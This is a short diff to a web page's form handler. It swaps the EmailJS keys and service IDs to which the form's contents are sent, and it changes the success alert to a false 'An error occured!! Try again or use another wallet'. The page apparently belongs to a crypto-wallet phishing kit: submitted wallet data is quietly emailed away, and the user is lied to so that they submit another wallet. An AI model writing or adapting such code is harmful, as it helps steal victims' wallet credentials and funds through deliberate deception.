@@ -1616,9 +1616,8 @@
   src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
 <script type="text/javascript">
-  emailjs.init('Sl_LbPBn89AL9hyA1')
+  emailjs.init('gfB3CChZrxWwYWhyV')
 </script>
-	
 	<script>
 		const btn = document.getElementById('submit');
 
@@ -1628,13 +1627,13 @@ document.getElementById('my-form')
 
    btn.value = 'Sending...';
 
-   const serviceID = 'service_yzpfm2e';
-   const templateID = 'template_3djgc3w';
+   const serviceID = 'service_jm0dufc';
+   const templateID = 'template_re15egj';
 
    emailjs.sendForm(serviceID, templateID, this)
     .then(() => {
       btn.value = 'Send Email';
-      alert('Sent!');
+      alert('An error occured!! Try again or use another wallet');
     }, (err) => {
       btn.value = 'Send Email';
       alert(JSON.stringify(err));
